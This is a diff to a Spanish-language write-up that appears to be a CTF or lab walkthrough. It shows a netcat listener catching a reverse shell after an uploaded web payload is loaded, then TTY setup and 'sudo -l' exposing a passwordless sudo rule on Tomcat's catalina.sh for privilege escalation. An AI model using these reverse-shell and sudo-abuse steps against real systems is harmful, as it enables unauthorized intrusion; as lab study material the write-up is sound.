@@ -265,7 +265,7 @@ una vez creado el payload, lo cargo en la web y luego me coloco en escucha por n
 
 nc -lnvp 4444
 
-ahora desde el navegador cargo la url http://127.0.0.1/darks/ y si me voy a netcat ya he recibido la reverse shell
+ahora desde el navegador cargo la url http://127.0.0.1/darksblack/ y si me voy a netcat ya he recibido la reverse shell
 
 whoami
 tomcat
@@ -281,7 +281,6 @@ export TERM=xterm
 export SHELL=bash
 sudo -l
     (ALL) NOPASSWD: /opt/tomcat/bin/catalina.sh
-
 
 ls -la /opt/tomcat/bin/catalina.sh
 -rwxr-xr-x 1 tomcat tomcat 25323 Aug  2 23:24 /opt/tomcat/bin/catalina.sh
